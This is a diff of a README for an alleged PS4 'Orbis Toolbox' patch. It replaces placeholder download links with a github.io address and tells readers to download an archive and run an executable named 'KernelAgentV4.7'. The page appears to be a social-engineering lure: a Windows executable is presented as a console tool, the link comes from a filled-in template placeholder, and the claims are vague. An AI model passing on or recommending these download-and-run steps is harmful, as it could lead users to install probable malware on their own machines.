@@ -2,13 +2,13 @@
 
 Enhance Orbis Toolbox for jailbroken PS4 systems by unlocking hidden developer options, fixing toolset instability, and optimizing payload injection. Powered by `KernelAgentV4.7`.
 
-[![Download Orbis Patch](https://img.shields.io/badge/Download-Orbis_Toolbox_Patch-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Orbis Patch](https://img.shields.io/badge/Download-Orbis_Toolbox_Patch-blueviolet)](orbis-toolbox-ps4-devtools-patch.github.io)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](orbis-toolbox-ps4-devtools-patch.github.io) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\OrbisFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will patch Orbis modules and system hooks for maximum compatibility  
